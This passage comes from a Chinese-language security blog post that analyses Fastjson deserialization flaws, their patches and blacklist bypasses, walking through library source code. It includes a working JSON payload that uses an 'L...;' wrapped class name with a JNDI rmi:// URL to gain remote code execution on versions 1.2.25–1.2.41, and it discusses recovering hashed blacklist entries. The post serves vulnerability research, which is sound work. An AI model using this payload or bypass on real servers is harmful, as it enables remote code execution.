class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> JSONLexer lexer = parser.lexer;</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;</span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//我们输入的json串中， _bytecodes 字段对应的值是String类型字符串，进入此处</span></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = lexer.bytesValue();<span class="comment">//进入此处，获取json串的值恢复到byte数组</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">return</span> (T) bytes;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>com.alibaba.fastjson.parser.JSONScanner#bytesValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] bytesValue() &#123;</span><br><span class="line">    <span class="keyword">return</span> IOUtils.decodeBase64(text, np + <span class="number">1</span>, sp);<span class="comment">//base64解码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见在代码逻辑中，字段的值从String恢复成<code>byte[]</code>，会经过一次base64解码。这是应该是fastjson在传输<code>byte[]</code>中做的一个内部规定。序列化时应该也会对byte[]自动base64编码。</p><p>try一下，果然如此。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae246qlpuj314y0zpgpt.jpg" alt="base64-3.png"></p><h3 id="getOutputProperties字段-gt-getOutputProperties方法"><a href="#getOutputProperties字段-gt-getOutputProperties方法" class="headerlink" title="_getOutputProperties字段 =&gt; getOutputProperties方法"></a>_getOutputProperties字段 =&gt; getOutputProperties方法</h3><p>简单的删掉<code>_</code>试一下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23y11clj31z60yftlz.jpg" alt="_outputProperties.png"></p><p>可以发现，并不会对结果造成什么影响，可见这个_不是必须的。</p><p>那么是在哪里对这个_进行了处理呢？</p><p>在字段解析之前，会对于当前字段进行一次智能匹配<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">parseField</span><span class="params">(DefaultJSONParser parser, String key, Object object, Type objectType,</span></span></span><br><span class="line"><span class="function"><span class="params">                              Map&lt;String, Object&gt; fieldValues)</span> </span>&#123;</span><br><span class="line">        JSONLexer lexer = parser.lexer; </span><br><span class="line">        FieldDeserializer fieldDeserializer = smartMatch(key);<span class="comment">//进入此处，根据json串的字段名来获取字段反序列化解析器。</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldDeserializer <span class="title">smartMatch</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       FieldDeserializer fieldDeserializer = getFieldDeserializer(key);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> startsWithIs = key.startsWith(<span class="string">"is"</span>);</span><br><span class="line">           ...</span><br><span class="line">               <span class="comment">//以下省略了对于is开头的字段的一些判断逻辑。</span></span><br><span class="line">               <span class="comment">//好像满足了一定条件，会去跟对应的符合getter，settger的方法名匹配。</span></span><br><span class="line">               <span class="comment">//好像又回到is方法可以调用不了，但是真的脑壳疼，漏洞关键也不在于此，就不纠结了。</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//遍历我们输入的key的每一个字符，匹配第一个-或_替换为空</span></span><br><span class="line">       <span class="keyword">if</span> (fieldDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">boolean</span> snakeOrkebab = <span class="keyword">false</span>;</span><br><span class="line">           String key2 = <span class="keyword">null</span>;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i) &#123;</span><br><span class="line">               <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">               <span class="keyword">if</span> (ch == <span class="string">'_'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"_"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                   snakeOrkebab = <span class="keyword">true</span>;</span><br><span class="line">                   key2 = key.replaceAll(<span class="string">"-"</span>, <span class="string">""</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        <span class="comment">//接下来根据替换后的key2，去寻找对应符合getter，setter的方法名进行匹配。</span></span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23khmmfj328l12jguc.jpg" alt="_output ok.png"></p><p>然后在赋值的时候完美触发getoutputProperties方法。</p><p><code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="keyword">null</span> <span class="comment">//</span></span><br><span class="line">            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="comment">//判断特殊类型</span></span><br><span class="line">                    ...</span><br><span class="line">                    <span class="comment">//进入getoutputProperties方法的返回值是Properties符合该一项（之前说过）</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    <span class="comment">//进入调用，object是我们的恶意TemplatesImpl类</span></span><br><span class="line">                        Map map = (Map) method.invoke(object);</span><br></pre></td></tr></table></figure><p>那么以上流程就是<code>_getOutputProperties</code>字段 =&gt; <code>getOutputProperties</code>方法具体演变的细节。那么以上分析结果也让我们知道加个骚气的小杠<code>-</code>应该也是可以的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae23atakrj31yj0wl49q.jpg" alt="-output 也可以.png"></p><p>至此就完成了在知道Templates触发类原理的情况下，变形衍生到了fastjson中完成RCE。</p><blockquote><p>至于Templates恶意类的第二个触发点，xalan 2.7.2的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，在JDK反序列化Gadgets7u21一文中有补充说明，这里就不多说了。</p></blockquote><h2 id="Fastjson抗争的一生"><a href="#Fastjson抗争的一生" class="headerlink" title="Fastjson抗争的一生"></a>Fastjson抗争的一生</h2><p>在讲述完最开始引发漏洞的1.2.24版本之后，其实接下来的部分才是开起此篇的初衷。但是因为基础实在是差+懒，直到现在才开始正文。</p><h3 id="1-2-24漏洞版本修复"><a href="#1-2-24漏洞版本修复" class="headerlink" title="1.2.24漏洞版本修复"></a>1.2.24漏洞版本修复</h3><p>在1.2.25版本，针对1.2.24版本进行了修复。</p><p>我们可以总结以下1.2.24版本的漏洞产生原因：</p><ol><li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的@type加载任意类+符合条件的setter与getter变成了反序列化利用点（个人总结的三要素中的反序列化漏洞触发点）。</li><li>在找到可以调用的setter、getter之后，从这个可以被出发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。（个人总结三要素中的反序列化利用链）</li><li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）（个人总结三要素中的反序列化payload触发点）</li></ol><blockquote><p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在@type中的getter、setter函数调用中也被用到）。我们应该对这两个点产生敏感性。</p></blockquote><p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>@type</code>标签进行一个白名单+黑名单的限制机制。</p><p>使用万能的idea对两个版本的jar包进行对比</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22z6chbj32bc0qx41t.jpg" alt="修复1.2.24.png"></p><p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p><p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p><p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true); （关闭白名单机制）</span><br></pre></td></tr></table></figure><p>由于checkAutoType中两条路线的代码是穿插的，我们先来看默认<code>AutoTypeSupport为False</code>时的代码。</p><p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(开启白名单机制)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">    <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//执行不到此处</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p><p>看一下默认黑名单，默认白名单（最下面，默认为空）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22owggwj30q80s1jt6.jpg" alt="修复1.2.24黑名单.png"></p><p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p><h3 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h3><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p><p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p><p><code>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见在显性关闭白名单的情况下，我们也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p><p>看似我们只能找到其他的利用类跟黑名单进行硬刚。但我们再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><ul><li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p><p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p></li><li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p></li></ul><p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//1.2.25-41绕过 jndi ldap</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.RowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">//1.2.25-41绕过 7u21</span><br><span class="line">同样加上L;，payload太长了且不唯一，就不写了</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22edebfj326g15vtmt.jpg" alt="1.2.25-jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae228422cj323s12utl9.jpg" alt="1.2.41-jndi-计算器.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae22090njj31yh16gn9j.jpg" alt="1.2.41-7u21-计算器.png"></p><h3 id="1-2-42版本修复"><a href="#1-2-42版本修复" class="headerlink" title="1.2.42版本修复"></a>1.2.42版本修复</h3><p>在1.2.42中对于1.2.41版本进行了修复，对于两个jar进行对比可以发现<code>DefaultJSONParser.java</code>没有什么关键的修改。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21szagqj32bc0y5430.jpg" alt="1.41-1.42比较.png"></p><p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p><ol><li>修改明文黑名单为黑名单hash</li><li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li></ol><p>黑名单大致形式如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae21hu6b9j30gf0cxq3f.jpg" alt="1.2.42黑名单hash.png"></p><p>虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写<code>com.alibaba.fastjson.parser.ParserConfig#addDeny</code>中的<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">fnv1a_64</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> hashCode = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.length(); ++i)&#123;</span><br><span class="line">            <span class="keyword">char</span> ch = key.charAt(i);</span><br><span class="line">            hashCode ^= ch;</span><br><span class="line">            hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//可以注意到，计算hash是遍历每一位进行固定的异或和乘法运算进行累积运算</span></span><br></pre></td></tr></table></figure><p>有一个<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">Github项目</a>就是完成了这样的事情，并列出了目前已经得到的hash。</p><p>再是对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code>。</p><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// hash算法常量</span></span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> BASIC = <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">long</span> PRIME = <span class="number">0x100000001b3L</span>;</span><br><span class="line"><span class="comment">// 对传入类名的第一位和最后一位做了hash，如果是L开头，;结尾，删去开头结尾</span></span><br><span class="line"><span class="comment">// 